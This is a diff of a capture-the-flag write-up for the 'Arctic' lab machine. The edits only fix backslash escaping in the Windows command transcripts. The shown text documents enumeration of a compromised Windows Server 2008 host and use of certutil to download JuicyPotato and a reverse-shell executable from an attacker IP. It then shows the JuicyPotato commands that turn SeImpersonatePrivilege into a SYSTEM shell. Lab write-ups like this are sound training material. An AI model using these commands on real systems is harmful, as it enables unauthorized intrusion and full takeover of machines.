@@ -79,7 +79,7 @@ UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
 Bindings: 
           ncacn_ip_tcp:10.10.10.11[49152]
           ncalrpc:[WindowsShutdown]
-          ncacn_np:\\\\ARCTIC[\\PIPE\\InitShutdown]
+          ncacn_np:\\ARCTIC[\PIPE\InitShutdown]
           ncalrpc:[WMsgKRpc0839F0]
 
 Protocol: N/A 
@@ -87,7 +87,7 @@ Provider: winlogon.exe
 UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0 
 Bindings: 
           ncalrpc:[WindowsShutdown]
-          ncacn_np:\\\\ARCTIC[\\PIPE\\InitShutdown]
+          ncacn_np:\\ARCTIC[\PIPE\InitShutdown]
           ncalrpc:[WMsgKRpc0839F0]
           ncalrpc:[WMsgKRpc086FB1]
 [...]
@@ -314,8 +314,8 @@ Executing the payload...
 listening on [any] 443 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49324
 [...]
-C:\\ColdFusion8\\runtime\\bin>whoami && ipconfig /all
-arctic\\tolis
+C:\ColdFusion8\runtime\bin>whoami && ipconfig /all
+arctic\tolis
 
 Windows IP Configuration
 
@@ -343,7 +343,7 @@ I'm user `arctic\tolis`!
 
 **user.txt:**
 ```shell
-C:\\Users\\tolis\\Desktop>type user.txt
+C:\Users\tolis\Desktop>type user.txt
 {Redacted}
 ```
 
@@ -355,7 +355,7 @@ After gaining initial foothold on the target machine, we can perform system enum
 
 **Local users:**
 ```shell
-C:\\ColdFusion8\\runtime\\bin>net user
+C:\ColdFusion8\runtime\bin>net user
 [...]
 -------------------------------------------------------------------------------
 Administrator            Guest                    tolis                    
@@ -366,7 +366,7 @@ Administrator            Guest                    tolis
 
 **User `tolis` details:**
 ```shell
-C:\\ColdFusion8\\runtime\\bin>net user tolis
+C:\ColdFusion8\runtime\bin>net user tolis
 User name                    tolis
 Full Name                    tolis
 [...]
@@ -378,7 +378,7 @@ Nothing useful, as `tolis` is only a member of local group `Users`.
 
 **System information:**
 ```shell
-C:\\ColdFusion8\\runtime\\bin>systeminfo
+C:\ColdFusion8\runtime\bin>systeminfo
 [...]
 OS Name:                   Microsoft Windows Server 2008 R2 Standard 
 OS Version:                6.1.7600 N/A Build 7600
@@ -393,7 +393,7 @@ Maybe we can exploit some Kernel Exploits (KE)?
 
 **User `tolis`'s privilege:**
 ```shell
-C:\\ColdFusion8\\runtime\\bin>whoami /priv
+C:\ColdFusion8\runtime\bin>whoami /priv
 [...]
 Privilege Name                Description                               State   
 ============================= ========================================= ========
@@ -407,7 +407,7 @@ User `tolis`' has `SeImpersonatePrivilege`. Maybe we can use **potato exploit** 
 
 **Unquoted service path:**
 ```shell
-C:\\ColdFusion8\\runtime\\bin>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+C:\ColdFusion8\runtime\bin>wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 ColdFusion 8 .NET Service                               ColdFusion 8 .NET Service        C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe                                                                        Auto       
 ```
 
@@ -417,11 +417,11 @@ Hmm... This service "ColdFusion 8 .NET Service" looks kinda interesting...
 
 - **Check `CF8DotNetsvc.exe` permission:**
 ```shell
-C:\\ColdFusion8\\runtime\\bin>icacls C:\\ColdFusion8\\jnbridge\\CF8DotNetsvc.exe
-C:\\ColdFusion8\\jnbridge\\CF8DotNetsvc.exe ARCTIC\\tolis:(I)(F)
-                                         NT AUTHORITY\\SYSTEM:(I)(F)
-                                         BUILTIN\\Administrators:(I)(F)
-                                         BUILTIN\\Users:(I)(RX)
+C:\ColdFusion8\runtime\bin>icacls C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe
+C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe ARCTIC\tolis:(I)(F)
+                                         NT AUTHORITY\SYSTEM:(I)(F)
+                                         BUILTIN\Administrators:(I)(F)
+                                         BUILTIN\Users:(I)(RX)
 ```
 
 Ah ha, **User `tolis` has full control!** Which means we can overwrite `CF8DotNetsvc.exe`, and replace it with a reverse shell.
@@ -429,20 +429,20 @@ Ah ha, **User `tolis` has full control!** Which means we can overwrite `CF8DotNe
 - **Check if `tolis` is able to restart service/machine:**
 
 ```shell
-C:\\ColdFusion8\\runtime\\bin>sc stop "ColdFusion 8 .NET Service"
+C:\ColdFusion8\runtime\bin>sc stop "ColdFusion 8 .NET Service"
 [SC] OpenService FAILED 5:
 
 Access is denied.
 
 
-C:\\ColdFusion8\\runtime\\bin>sc qc "ColdFusion 8 .NET Service"
+C:\ColdFusion8\runtime\bin>sc qc "ColdFusion 8 .NET Service"
 [SC] QueryServiceConfig SUCCESS
 
 SERVICE_NAME: ColdFusion 8 .NET Service
         TYPE               : 110  WIN32_OWN_PROCESS (interactive)
         START_TYPE         : 2   AUTO_START
         ERROR_CONTROL      : 1   NORMAL
-        BINARY_PATH_NAME   : C:\\ColdFusion8\\jnbridge\\CF8DotNetsvc.exe
+        BINARY_PATH_NAME   : C:\ColdFusion8\jnbridge\CF8DotNetsvc.exe
         LOAD_ORDER_GROUP   : 
         TAG                : 0
         DISPLAY_NAME       : ColdFusion 8 .NET Service
@@ -451,7 +451,7 @@ SERVICE_NAME: ColdFusion 8 .NET Service
 ```
 
 ```shell
-C:\\ColdFusion8\\runtime\\bin>whoami /priv
+C:\ColdFusion8\runtime\bin>whoami /priv
 [...]
 Privilege Name                Description                               State   
 ============================= ========================================= ========
@@ -479,7 +479,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 ```shell
-C:\\ColdFusion8\\runtime\\bin>certutil -urlcache -split -f http://10.10.14.8/JuicyPotato.exe C:\\Users\\tolis\\Desktop\\JuicyPotato.exe
+C:\ColdFusion8\runtime\bin>certutil -urlcache -split -f http://10.10.14.8/JuicyPotato.exe C:\Users\tolis\Desktop\JuicyPotato.exe
 [...]
 CertUtil: -URLCache command completed successfully.
 ```
@@ -487,11 +487,11 @@ CertUtil: -URLCache command completed successfully.
 - **Test the exploit:**
 
 ```shell
-C:\\ColdFusion8\\runtime\\bin>C:\\Users\\tolis\\Desktop\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c whoami"
+C:\ColdFusion8\runtime\bin>C:\Users\tolis\Desktop\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c whoami"
 Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
 ....
 [+] authresult 0
-{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\\SYSTEM
+{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
 
 [+] CreateProcessWithTokenW OK
 ```
@@ -522,7 +522,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
 ```shell
-C:\\ColdFusion8\\runtime\\bin>certutil -urlcache -split -f http://10.10.14.8/revshell_stageless_system.exe C:\\Users\\tolis\\Desktop\\revshell_stageless_system.exe
+C:\ColdFusion8\runtime\bin>certutil -urlcache -split -f http://10.10.14.8/revshell_stageless_system.exe C:\Users\tolis\Desktop\revshell_stageless_system.exe
 [...]
 CertUtil: -URLCache command completed successfully.
 ```
@@ -538,8 +538,8 @@ listening on [any] 53 ...
 - **Test the reverse shell:**
 
 ```shell
-C:\\ColdFusion8\\runtime\\bin>C:\\Users\\tolis\\Desktop\\revshell_stageless_system.exe
-C:\\ColdFusion8\\runtime\\bin>
+C:\ColdFusion8\runtime\bin>C:\Users\tolis\Desktop\revshell_stageless_system.exe
+C:\ColdFusion8\runtime\bin>
 ```
 
 ```shell
@@ -548,9 +548,9 @@ C:\\ColdFusion8\\runtime\\bin>
 listening on [any] 53 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49492
 [...]
-C:\\ColdFusion8\\runtime\\bin>whoami
+C:\ColdFusion8\runtime\bin>whoami
 whoami
-arctic\\tolis
+arctic\tolis
 ```
 
 It worked!
@@ -564,11 +564,11 @@ listening on [any] 53 ...
 ```
 
 ```shell
-C:\\ColdFusion8\\runtime\\bin>C:\\Users\\tolis\\Desktop\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c C:\Users\tolis\Desktop\revshell_stageless_system.exe"
+C:\ColdFusion8\runtime\bin>C:\Users\tolis\Desktop\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c C:\Users\tolis\Desktop\revshell_stageless_system.exe"
 Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
 ....
 [+] authresult 0
-{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\\SYSTEM
+{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM
 
 [+] CreateProcessWithTokenW OK
 ```
@@ -581,8 +581,8 @@ Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
 listening on [any] 53 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49505
 [...]
-C:\\Windows\\system32>whoami && ipconfig /all
-nt authority\\system
+C:\Windows\system32>whoami && ipconfig /all
+nt authority\system
 
 Windows IP Configuration
 
@@ -612,7 +612,7 @@ I'm now `NT AUTHORITY\SYSTEM`! :D
 
 **root.txt:**
 ```shell
-C:\\Users\\Administrator\\Desktop>type root.txt
+C:\Users\Administrator\Desktop>type root.txt
 {Redacted}
 ```
 
